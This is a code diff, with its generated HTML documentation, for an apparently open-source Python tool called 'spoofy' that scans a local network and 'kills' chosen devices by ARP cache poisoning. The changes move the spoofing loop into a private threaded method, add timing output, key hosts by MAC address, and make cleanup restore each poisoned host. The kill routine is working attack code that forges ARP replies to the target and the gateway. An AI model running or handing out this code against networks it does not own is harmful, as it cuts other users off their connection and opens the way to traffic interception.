@@ -32,17 +32,18 @@ logging.getLogger(&#39;scapy.runtime&#39;).setLevel(logging.ERROR)
 import os
 
 from .settings import Settings
-from .utilities import threaded
 from ipaddress import IPv4Interface, ip_address
 from manuf import MacParser
 from scapy.all import ARP, Ether, conf, getmacbyip, send, srp
 from subprocess import check_output
-from time import sleep
+from threading import Thread, active_count
+from time import perf_counter, sleep
 
 class Network():
     &#34;&#34;&#34;
     Network class to handle anything network related.
     &#34;&#34;&#34;
+    __get = {&#39;hosts&#39;: {}, &#39;mac&#39;: {}}
     __killed = {}
     __mac_parser = MacParser()
     __vendor_tags = {
@@ -52,17 +53,55 @@ class Network():
     }
 
     #: Dictionary data structure
-    get = {&#39;hosts&#39;: {}}
+    get = {}
+
+    @classmethod
+    def __kill(cls, host):
+        &#34;&#34;&#34;
+        Spoof given host by poisoning ARP cache repeatedly.
+
+        This method should run in thread.
+
+        Parameter:
+            host -- (dictionary) host fetched from cls.get
+        &#34;&#34;&#34;
+        packets = {
+            &#39;gateway&#39;: ARP(
+                psrc = host[&#39;ip&#39;],
+                pdst = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                hwdst = cls.get[&#39;gateway&#39;][&#39;mac&#39;]
+            ),
+            &#39;host&#39;: ARP(
+                psrc = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                pdst = host[&#39;ip&#39;],
+                hwdst = host[&#39;mac&#39;]
+            )
+        }
+
+        # Poison ARP cache
+        while (host[&#39;mac&#39;] in cls.__killed):
+            if (not Settings.get[&#39;SAFE_MODE&#39;]):
+                send(packets[&#39;host&#39;], verbose=False)
+                send(packets[&#39;gateway&#39;], verbose=False)
+                sleep(Settings.get[&#39;DELAY&#39;])
 
     @classmethod
     def cleanup(cls):
         &#34;&#34;&#34;
         Reset spoofed hosts before termination.
         &#34;&#34;&#34;
-        if (cls.get_killed() &gt; 0):
-            cls.__killed.clear()
-            print(&#34;Resetting spoofed hosts...&#34;)
-            sleep(Settings.get[&#39;DELAY&#39;])
+        if (cls.get_killed() == 0):
+            return
+
+        print(&#34;Resetting spoofed hosts...&#34;)
+        killed_hosts = list(cls.__killed.keys())
+        for mac in killed_hosts:
+            t = Thread(target=cls.revive, args=(cls.get[&#39;hosts&#39;][mac],))
+            t.start()
+
+        # Wait until only main thread remains
+        while (active_count() &gt; 1):
+            pass
 
     @classmethod
     def get_gateway(cls):
@@ -79,6 +118,16 @@ class Network():
         return cls.get[&#39;gateway&#39;]
 
     @classmethod
+    def get_host_by_ip(cls, ip):
+        &#34;&#34;&#34;
+        Return dictionary of host.
+
+        Parameter:
+            ip -- (string) host IP address
+        &#34;&#34;&#34;
+        return cls.get[&#39;hosts&#39;][cls.get[&#39;mac&#39;][ip]]
+
+    @classmethod
     def get_hosts(cls):
         &#34;&#34;&#34;
         Get network hosts information via ARP requests.
@@ -89,7 +138,7 @@ class Network():
 
         ans = srp(
             Ether(dst=&#39;ff:ff:ff:ff:ff:ff&#39;) / ARP(pdst=f&#34;{cls.get[&#39;interface&#39;][&#39;ip_cidr&#39;]}&#34;),
-            timeout = 2,
+            timeout = Settings.get[&#39;TIMEOUT&#39;],
             verbose = False
         )[0]
 
@@ -98,7 +147,8 @@ class Network():
             ip = h[1].psrc
             mac = h[1].hwsrc
             ip_lengths.append(len(ip))
-            cls.get[&#39;hosts&#39;][ip] = {
+            cls.get[&#39;mac&#39;][ip] = mac
+            cls.get[&#39;hosts&#39;][mac] = {
                 &#39;ip&#39;: ip,
                 &#39;mac&#39;: mac,
                 &#39;vendor&#39;: cls.__mac_parser.get_manuf(mac),
@@ -162,66 +212,59 @@ class Network():
         &#34;&#34;&#34;
         Get interface, gateway, and network hosts information.
         &#34;&#34;&#34;
+        cls.get = dict(cls.__get)
         cls.get_interface()
         cls.get_gateway()
+        st = perf_counter()
         cls.get_hosts()
 
         if (Settings.get[&#39;DEBUG&#39;]):
-            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;interface&#39;]:&#34;)
+            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;interface&#39;]&#34;)
             print(f&#34;{&#39;&#39;:4}{cls.get[&#39;interface&#39;]}&#34;)
-            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;gateway&#39;]:&#34;)
+            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;gateway&#39;]&#34;)
             print(f&#34;{&#39;&#39;:4}{cls.get[&#39;gateway&#39;]}&#34;)
+            print(f&#34;{&#39;&#39;:2}(d) Network.get_hosts()&#34;)
+            print(f&#34;{&#39;&#39;:4}{perf_counter()-st:.3f}s&#34;)
 
     @classmethod
-    @threaded
     def kill(cls, host):
         &#34;&#34;&#34;
-        Spoof given host by poisoning ARP cache repeatedly.
-
-        This method runs in thread.
+        Start cls.__kill() in thread if host is alive.
 
         Parameter:
             host -- (dictionary) host fetched from cls.get
         &#34;&#34;&#34;
         # Check if host already been killed
         if (host[&#39;mac&#39;] in cls.__killed):
-            print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is already killed&#34;)
+            print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is already killed (~{perf_counter()-cls.__killed[host[&#39;mac&#39;]][&#39;st&#39;]:.3f}s)&#34;)
             return
-        cls.__killed[host[&#39;mac&#39;]] = True
 
-        packets = {
-            &#39;gateway&#39;: ARP(
-                psrc = host[&#39;ip&#39;],
-                pdst = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
-                hwdst = cls.get[&#39;gateway&#39;][&#39;mac&#39;]
-            ),
-            &#39;host&#39;: ARP(
-                psrc = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
-                pdst = host[&#39;ip&#39;],
-                hwdst = host[&#39;mac&#39;]
-            )
+        # Register host in killed list
+        cls.__killed[host[&#39;mac&#39;]] = {
+            &#39;st&#39;: perf_counter(),
+            &#39;thread&#39;: Thread(target=cls.__kill, args=(host,))
         }
+        cls.__killed[host[&#39;mac&#39;]][&#39;thread&#39;].start()
 
-        # Poison ARP cache
+        # Artificial delay for consistent UX
+        if (not Settings.get[&#39;SAFE_MODE&#39;]):
+            sleep(Settings.get[&#39;DELAY&#39;])
         print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is killed&#34;)
-        while (host[&#39;mac&#39;] in cls.__killed):
-            if (not Settings.get[&#39;SAFE_MODE&#39;]):
-                send(packets[&#39;host&#39;], verbose=False)
-                send(packets[&#39;gateway&#39;], verbose=False)
-                sleep(Settings.get[&#39;DELAY&#39;])
-        print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is revived&#34;)
 
     @classmethod
-    @threaded
     def revive(cls, host):
         &#34;&#34;&#34;
-        Un-spoof given host by stopping spoof thread.
-
-        This method runs in thread.
+        Un-spoof given host by stopping spoof thread and reset ARP packets.
 
         Parameter:
             host -- (dictionary) host fetched from cls.get
         &#34;&#34;&#34;
+        if (host[&#39;mac&#39;] not in cls.__killed):
+            print(f&#34;{&#39;&#39;:2}(w) &#39;{host[&#39;mac&#39;]}&#39; is alive!&#34;)
+            return
+
+        st = cls.__killed[host[&#39;mac&#39;]][&#39;st&#39;]
+        t = cls.__killed[host[&#39;mac&#39;]][&#39;thread&#39;]
         del cls.__killed[host[&#39;mac&#39;]]
 
         packets = {
@@ -239,10 +282,15 @@ class Network():
             )
         }
 
+        # Wait for target thread to terminate
+        t.join()
+
         # Reset packets to host and gateway
         if (not Settings.get[&#39;SAFE_MODE&#39;]):
             send(packets[&#39;host&#39;], verbose=False)
             send(packets[&#39;gateway&#39;], verbose=False)
+
+        print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is revived ({perf_counter()-st:.3f}s)&#34;)
 
     @classmethod
     def spoof(cls, host):
@@ -294,6 +342,7 @@ class Network():
     &#34;&#34;&#34;
     Network class to handle anything network related.
     &#34;&#34;&#34;
+    __get = {&#39;hosts&#39;: {}, &#39;mac&#39;: {}}
     __killed = {}
     __mac_parser = MacParser()
     __vendor_tags = {
@@ -303,17 +352,55 @@ class Network():
     }
 
     #: Dictionary data structure
-    get = {&#39;hosts&#39;: {}}
+    get = {}
+
+    @classmethod
+    def __kill(cls, host):
+        &#34;&#34;&#34;
+        Spoof given host by poisoning ARP cache repeatedly.
+
+        This method should run in thread.
+
+        Parameter:
+            host -- (dictionary) host fetched from cls.get
+        &#34;&#34;&#34;
+        packets = {
+            &#39;gateway&#39;: ARP(
+                psrc = host[&#39;ip&#39;],
+                pdst = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                hwdst = cls.get[&#39;gateway&#39;][&#39;mac&#39;]
+            ),
+            &#39;host&#39;: ARP(
+                psrc = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+                pdst = host[&#39;ip&#39;],
+                hwdst = host[&#39;mac&#39;]
+            )
+        }
+
+        # Poison ARP cache
+        while (host[&#39;mac&#39;] in cls.__killed):
+            if (not Settings.get[&#39;SAFE_MODE&#39;]):
+                send(packets[&#39;host&#39;], verbose=False)
+                send(packets[&#39;gateway&#39;], verbose=False)
+                sleep(Settings.get[&#39;DELAY&#39;])
 
     @classmethod
     def cleanup(cls):
         &#34;&#34;&#34;
         Reset spoofed hosts before termination.
         &#34;&#34;&#34;
-        if (cls.get_killed() &gt; 0):
-            cls.__killed.clear()
-            print(&#34;Resetting spoofed hosts...&#34;)
-            sleep(Settings.get[&#39;DELAY&#39;])
+        if (cls.get_killed() == 0):
+            return
+
+        print(&#34;Resetting spoofed hosts...&#34;)
+        killed_hosts = list(cls.__killed.keys())
+        for mac in killed_hosts:
+            t = Thread(target=cls.revive, args=(cls.get[&#39;hosts&#39;][mac],))
+            t.start()
+
+        # Wait until only main thread remains
+        while (active_count() &gt; 1):
+            pass
 
     @classmethod
     def get_gateway(cls):
@@ -330,6 +417,16 @@ class Network():
         return cls.get[&#39;gateway&#39;]
 
     @classmethod
+    def get_host_by_ip(cls, ip):
+        &#34;&#34;&#34;
+        Return dictionary of host.
+
+        Parameter:
+            ip -- (string) host IP address
+        &#34;&#34;&#34;
+        return cls.get[&#39;hosts&#39;][cls.get[&#39;mac&#39;][ip]]
+
+    @classmethod
     def get_hosts(cls):
         &#34;&#34;&#34;
         Get network hosts information via ARP requests.
@@ -340,7 +437,7 @@ class Network():
 
         ans = srp(
             Ether(dst=&#39;ff:ff:ff:ff:ff:ff&#39;) / ARP(pdst=f&#34;{cls.get[&#39;interface&#39;][&#39;ip_cidr&#39;]}&#34;),
-            timeout = 2,
+            timeout = Settings.get[&#39;TIMEOUT&#39;],
             verbose = False
         )[0]
 
@@ -349,7 +446,8 @@ class Network():
             ip = h[1].psrc
             mac = h[1].hwsrc
             ip_lengths.append(len(ip))
-            cls.get[&#39;hosts&#39;][ip] = {
+            cls.get[&#39;mac&#39;][ip] = mac
+            cls.get[&#39;hosts&#39;][mac] = {
                 &#39;ip&#39;: ip,
                 &#39;mac&#39;: mac,
                 &#39;vendor&#39;: cls.__mac_parser.get_manuf(mac),
@@ -413,66 +511,59 @@ class Network():
         &#34;&#34;&#34;
         Get interface, gateway, and network hosts information.
         &#34;&#34;&#34;
+        cls.get = dict(cls.__get)
         cls.get_interface()
         cls.get_gateway()
+        st = perf_counter()
         cls.get_hosts()
 
         if (Settings.get[&#39;DEBUG&#39;]):
-            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;interface&#39;]:&#34;)
+            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;interface&#39;]&#34;)
             print(f&#34;{&#39;&#39;:4}{cls.get[&#39;interface&#39;]}&#34;)
-            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;gateway&#39;]:&#34;)
+            print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;gateway&#39;]&#34;)
             print(f&#34;{&#39;&#39;:4}{cls.get[&#39;gateway&#39;]}&#34;)
+            print(f&#34;{&#39;&#39;:2}(d) Network.get_hosts()&#34;)
+            print(f&#34;{&#39;&#39;:4}{perf_counter()-st:.3f}s&#34;)
 
     @classmethod
-    @threaded
     def kill(cls, host):
         &#34;&#34;&#34;
-        Spoof given host by poisoning ARP cache repeatedly.
-
-        This method runs in thread.
+        Start cls.__kill() in thread if host is alive.
 
         Parameter:
             host -- (dictionary) host fetched from cls.get
         &#34;&#34;&#34;
         # Check if host already been killed
         if (host[&#39;mac&#39;] in cls.__killed):
-            print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is already killed&#34;)
+            print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is already killed (~{perf_counter()-cls.__killed[host[&#39;mac&#39;]][&#39;st&#39;]:.3f}s)&#34;)
             return
-        cls.__killed[host[&#39;mac&#39;]] = True
 
-        packets = {
-            &#39;gateway&#39;: ARP(
-                psrc = host[&#39;ip&#39;],
-                pdst = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
-                hwdst = cls.get[&#39;gateway&#39;][&#39;mac&#39;]
-            ),
-            &#39;host&#39;: ARP(
-                psrc = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
-                pdst = host[&#39;ip&#39;],
-                hwdst = host[&#39;mac&#39;]
-            )
+        # Register host in killed list
+        cls.__killed[host[&#39;mac&#39;]] = {
+            &#39;st&#39;: perf_counter(),
+            &#39;thread&#39;: Thread(target=cls.__kill, args=(host,))
         }
+        cls.__killed[host[&#39;mac&#39;]][&#39;thread&#39;].start()
 
-        # Poison ARP cache
+        # Artificial delay for consistent UX
+        if (not Settings.get[&#39;SAFE_MODE&#39;]):
+            sleep(Settings.get[&#39;DELAY&#39;])
         print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is killed&#34;)
-        while (host[&#39;mac&#39;] in cls.__killed):
-            if (not Settings.get[&#39;SAFE_MODE&#39;]):
-                send(packets[&#39;host&#39;], verbose=False)
-                send(packets[&#39;gateway&#39;], verbose=False)
-                sleep(Settings.get[&#39;DELAY&#39;])
-        print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is revived&#34;)
 
     @classmethod
-    @threaded
     def revive(cls, host):
         &#34;&#34;&#34;
-        Un-spoof given host by stopping spoof thread.
-
-        This method runs in thread.
+        Un-spoof given host by stopping spoof thread and reset ARP packets.
 
         Parameter:
             host -- (dictionary) host fetched from cls.get
         &#34;&#34;&#34;
+        if (host[&#39;mac&#39;] not in cls.__killed):
+            print(f&#34;{&#39;&#39;:2}(w) &#39;{host[&#39;mac&#39;]}&#39; is alive!&#34;)
+            return
+
+        st = cls.__killed[host[&#39;mac&#39;]][&#39;st&#39;]
+        t = cls.__killed[host[&#39;mac&#39;]][&#39;thread&#39;]
         del cls.__killed[host[&#39;mac&#39;]]
 
         packets = {
@@ -490,10 +581,15 @@ class Network():
             )
         }
 
+        # Wait for target thread to terminate
+        t.join()
+
         # Reset packets to host and gateway
         if (not Settings.get[&#39;SAFE_MODE&#39;]):
             send(packets[&#39;host&#39;], verbose=False)
             send(packets[&#39;gateway&#39;], verbose=False)
+
+        print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is revived ({perf_counter()-st:.3f}s)&#34;)
 
     @classmethod
     def spoof(cls, host):
@@ -545,10 +641,18 @@ def cleanup(cls):
     &#34;&#34;&#34;
     Reset spoofed hosts before termination.
     &#34;&#34;&#34;
-    if (cls.get_killed() &gt; 0):
-        cls.__killed.clear()
-        print(&#34;Resetting spoofed hosts...&#34;)
-        sleep(Settings.get[&#39;DELAY&#39;])</code></pre>
+    if (cls.get_killed() == 0):
+        return
+
+    print(&#34;Resetting spoofed hosts...&#34;)
+    killed_hosts = list(cls.__killed.keys())
+    for mac in killed_hosts:
+        t = Thread(target=cls.revive, args=(cls.get[&#39;hosts&#39;][mac],))
+        t.start()
+
+    # Wait until only main thread remains
+    while (active_count() &gt; 1):
+        pass</code></pre>
 </details>
 </dd>
 <dt id="spoofy.network.Network.get_gateway"><code class="name flex">
@@ -576,6 +680,28 @@ def get_gateway(cls):
     return cls.get[&#39;gateway&#39;]</code></pre>
 </details>
 </dd>
+<dt id="spoofy.network.Network.get_host_by_ip"><code class="name flex">
+<span>def <span class="ident">get_host_by_ip</span></span>(<span>ip)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Return dictionary of host.</p>
+<h2 id="parameter">Parameter</h2>
+<p>ip &ndash; (string) host IP address</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def get_host_by_ip(cls, ip):
+    &#34;&#34;&#34;
+    Return dictionary of host.
+
+    Parameter:
+        ip -- (string) host IP address
+    &#34;&#34;&#34;
+    return cls.get[&#39;hosts&#39;][cls.get[&#39;mac&#39;][ip]]</code></pre>
+</details>
+</dd>
 <dt id="spoofy.network.Network.get_hosts"><code class="name flex">
 <span>def <span class="ident">get_hosts</span></span>(<span>)</span>
 </code></dt>
@@ -597,7 +723,7 @@ def get_hosts(cls):
 
     ans = srp(
         Ether(dst=&#39;ff:ff:ff:ff:ff:ff&#39;) / ARP(pdst=f&#34;{cls.get[&#39;interface&#39;][&#39;ip_cidr&#39;]}&#34;),
-        timeout = 2,
+        timeout = Settings.get[&#39;TIMEOUT&#39;],
         verbose = False
     )[0]
 
@@ -606,7 +732,8 @@ def get_hosts(cls):
         ip = h[1].psrc
         mac = h[1].hwsrc
         ip_lengths.append(len(ip))
-        cls.get[&#39;hosts&#39;][ip] = {
+        cls.get[&#39;mac&#39;][ip] = mac
+        cls.get[&#39;hosts&#39;][mac] = {
             &#39;ip&#39;: ip,
             &#39;mac&#39;: mac,
             &#39;vendor&#39;: cls.__mac_parser.get_manuf(mac),
@@ -714,57 +841,109 @@ def initialize(cls):
     &#34;&#34;&#34;
     Get interface, gateway, and network hosts information.
     &#34;&#34;&#34;
+    cls.get = dict(cls.__get)
     cls.get_interface()
     cls.get_gateway()
+    st = perf_counter()
     cls.get_hosts()
 
     if (Settings.get[&#39;DEBUG&#39;]):
-        print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;interface&#39;]:&#34;)
+        print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;interface&#39;]&#34;)
         print(f&#34;{&#39;&#39;:4}{cls.get[&#39;interface&#39;]}&#34;)
-        print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;gateway&#39;]:&#34;)
-        print(f&#34;{&#39;&#39;:4}{cls.get[&#39;gateway&#39;]}&#34;)</code></pre>
+        print(f&#34;{&#39;&#39;:2}(d) Network.get[&#39;gateway&#39;]&#34;)
+        print(f&#34;{&#39;&#39;:4}{cls.get[&#39;gateway&#39;]}&#34;)
+        print(f&#34;{&#39;&#39;:2}(d) Network.get_hosts()&#34;)
+        print(f&#34;{&#39;&#39;:4}{perf_counter()-st:.3f}s&#34;)</code></pre>
 </details>
 </dd>
 <dt id="spoofy.network.Network.kill"><code class="name flex">
-<span>def <span class="ident">kill</span></span>(<span>*args, **kwargs)</span>
+<span>def <span class="ident">kill</span></span>(<span>host)</span>
 </code></dt>
 <dd>
-<div class="desc"><p>Run method in thread to avoid blocking.</p>
-<p>Intended for Network.kill() and Network.revive().</p></div>
+<div class="desc"><p>Start cls.__kill() in thread if host is alive.</p>
+<h2 id="parameter">Parameter</h2>
+<p>host &ndash; (dictionary) host fetched from cls.get</p></div>
 <details class="source">
 <summary>
 <span>Expand source code</span>
 </summary>
-<pre><code class="python">def run(*args, **kwargs):
+<pre><code class="python">@classmethod
+def kill(cls, host):
     &#34;&#34;&#34;
-    Run method in thread to avoid blocking.
+    Start cls.__kill() in thread if host is alive.
 
-    Intended for Network.kill() and Network.revive().
+    Parameter:
+        host -- (dictionary) host fetched from cls.get
     &#34;&#34;&#34;
-    thread = Thread(target=fn, args=args, kwargs=kwargs)
-    thread.start()
-    return thread</code></pre>
+    # Check if host already been killed
+    if (host[&#39;mac&#39;] in cls.__killed):
+        print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is already killed (~{perf_counter()-cls.__killed[host[&#39;mac&#39;]][&#39;st&#39;]:.3f}s)&#34;)
+        return
+
+    # Register host in killed list
+    cls.__killed[host[&#39;mac&#39;]] = {
+        &#39;st&#39;: perf_counter(),
+        &#39;thread&#39;: Thread(target=cls.__kill, args=(host,))
+    }
+    cls.__killed[host[&#39;mac&#39;]][&#39;thread&#39;].start()
+
+    # Artificial delay for consistent UX
+    if (not Settings.get[&#39;SAFE_MODE&#39;]):
+        sleep(Settings.get[&#39;DELAY&#39;])
+    print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is killed&#34;)</code></pre>
 </details>
 </dd>
 <dt id="spoofy.network.Network.revive"><code class="name flex">
-<span>def <span class="ident">revive</span></span>(<span>*args, **kwargs)</span>
+<span>def <span class="ident">revive</span></span>(<span>host)</span>
 </code></dt>
 <dd>
-<div class="desc"><p>Run method in thread to avoid blocking.</p>
-<p>Intended for Network.kill() and Network.revive().</p></div>
+<div class="desc"><p>Un-spoof given host by stopping spoof thread and reset ARP packets.</p>
+<h2 id="parameter">Parameter</h2>
+<p>host &ndash; (dictionary) host fetched from cls.get</p></div>
 <details class="source">
 <summary>
 <span>Expand source code</span>
 </summary>
-<pre><code class="python">def run(*args, **kwargs):
+<pre><code class="python">@classmethod
+def revive(cls, host):
     &#34;&#34;&#34;
-    Run method in thread to avoid blocking.
+    Un-spoof given host by stopping spoof thread and reset ARP packets.
 
-    Intended for Network.kill() and Network.revive().
+    Parameter:
+        host -- (dictionary) host fetched from cls.get
     &#34;&#34;&#34;
-    thread = Thread(target=fn, args=args, kwargs=kwargs)
-    thread.start()
-    return thread</code></pre>
+    if (host[&#39;mac&#39;] not in cls.__killed):
+        print(f&#34;{&#39;&#39;:2}(w) &#39;{host[&#39;mac&#39;]}&#39; is alive!&#34;)
+        return
+
+    st = cls.__killed[host[&#39;mac&#39;]][&#39;st&#39;]
+    t = cls.__killed[host[&#39;mac&#39;]][&#39;thread&#39;]
+    del cls.__killed[host[&#39;mac&#39;]]
+
+    packets = {
+        &#39;gateway&#39;: ARP(
+            psrc = host[&#39;ip&#39;],
+            hwsrc = host[&#39;mac&#39;],
+            pdst = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+            hwdst = cls.get[&#39;gateway&#39;][&#39;mac&#39;]
+        ),
+        &#39;host&#39;: ARP(
+            psrc = cls.get[&#39;gateway&#39;][&#39;ip&#39;],
+            hwsrc = cls.get[&#39;gateway&#39;][&#39;mac&#39;],
+            pdst = host[&#39;ip&#39;],
+            hwdst = host[&#39;mac&#39;]
+        )
+    }
+
+    # Wait for target thread to terminate
+    t.join()
+
+    # Reset packets to host and gateway
+    if (not Settings.get[&#39;SAFE_MODE&#39;]):
+        send(packets[&#39;host&#39;], verbose=False)
+        send(packets[&#39;gateway&#39;], verbose=False)
+
+    print(f&#34;{&#39;&#39;:2}&#39;{host[&#39;mac&#39;]} - {host[&#39;vendor&#39;]}&#39; is revived ({perf_counter()-st:.3f}s)&#34;)</code></pre>
 </details>
 </dd>
 <dt id="spoofy.network.Network.spoof"><code class="name flex">
@@ -843,6 +1022,7 @@ def tag_vendor(cls, vendor):
 <li><code><a title="spoofy.network.Network.cleanup" href="#spoofy.network.Network.cleanup">cleanup</a></code></li>
 <li><code><a title="spoofy.network.Network.get" href="#spoofy.network.Network.get">get</a></code></li>
 <li><code><a title="spoofy.network.Network.get_gateway" href="#spoofy.network.Network.get_gateway">get_gateway</a></code></li>
+<li><code><a title="spoofy.network.Network.get_host_by_ip" href="#spoofy.network.Network.get_host_by_ip">get_host_by_ip</a></code></li>
 <li><code><a title="spoofy.network.Network.get_hosts" href="#spoofy.network.Network.get_hosts">get_hosts</a></code></li>
 <li><code><a title="spoofy.network.Network.get_interface" href="#spoofy.network.Network.get_interface">get_interface</a></code></li>
 <li><code><a title="spoofy.network.Network.get_killed" href="#spoofy.network.Network.get_killed">get_killed</a></code></li>
